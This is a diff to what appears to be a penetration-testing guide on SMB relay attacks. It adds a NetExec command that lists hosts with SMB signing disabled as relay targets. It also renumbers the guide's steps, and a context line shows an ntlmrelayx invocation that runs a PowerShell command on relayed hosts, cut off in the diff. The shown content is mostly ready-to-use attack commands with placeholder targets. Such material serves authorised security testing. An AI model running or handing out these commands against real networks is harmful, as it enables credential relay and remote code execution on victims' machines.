@@ -10,7 +10,14 @@ An SMB relay attack is when an attacker catches a user's login attempt and passe
 
 The following code blocks shows how to abuse an SMB relay attack on the default manner, and with a coercion attack.<br>
 
-1. **Standard SMB relay attack:**
+1. **Retrieve all hosts with smb-signing disabled**
+
+```bash
+# 1. Retrieve all hosts with smb-signing disabled
+nxc smb {{RHOST}} --gen-relay-list relay_list.txt
+```
+
+2. **Standard SMB relay attack**
 
 ```bash
 ##### REQUIREMENTS:
@@ -46,7 +53,7 @@ sudo ntlmrelayx.py -tf targets.txt -smb2support --no-http-server -c "powershell 
 ##### END EXPLOITATION
 ```
 
-2. **SMB relay attack with coercion:**
+3. **SMB relay attack with coercion:**
 
 ```bash
 ##### DESCRIPTION
